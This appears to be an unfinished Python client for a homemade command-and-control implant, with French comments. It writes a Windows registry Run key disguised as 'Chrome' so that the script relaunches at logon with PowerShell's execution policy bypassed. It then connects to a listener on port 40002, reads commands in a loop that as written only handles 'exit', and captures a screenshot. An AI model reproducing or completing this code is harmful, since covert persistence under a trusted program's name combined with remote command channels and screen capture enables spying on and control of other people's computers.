import socket as s
from subprocess import PIPE, Popen
from PIL import ImageGrab
import subprocess

# Configuration de la persistance
app_name = "Chrome"
app_path = r"C:\Users\ldard\Bureau\Codes\C2\client.py"

powershell_script = f"""
$AppName = "{app_name}"
$AppPath = "{app_path}"

Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name $AppName -Value "powershell.exe -ExecutionPolicy Bypass -File $AppPath"
"""

try:
    subprocess.run(["powershell", "-Command", powershell_script], check=True)
    print("Le script PowerShell a été exécuté avec succès.")
except subprocess.CalledProcessError as e:
    print(f"Erreur lors de l'exécution du script PowerShell : {e}")
except Exception as e:
    print(f"Une erreur inattendue est survenue : {e}")

# Configuration du client
HOST_ADDR = '127.0.0.1'
HOST_PORT = 40002
TIMEOUT = 5  # Timeout de 5 secondes

def connect_to_server():
    client_socket = s.socket(s.AF_INET, s.SOCK_STREAM)
    client_socket.settimeout(TIMEOUT)  # Définir le timeout pour les opérations de socket
    client_socket.connect((HOST_ADDR, HOST_PORT))

    try:
        while True:
            command = client_socket.recv(4096).decode()
            if command.lower() == 'exit':
                break
    except s.timeout:
        print("La connexion a expiré.")
    finally:
        client_socket.close()

# Afficher la capture d'écran sans la sauvegarder
screen = ImageGrab.grab()
screen.show()

if __name__ == '__main__':
    connect_to_server()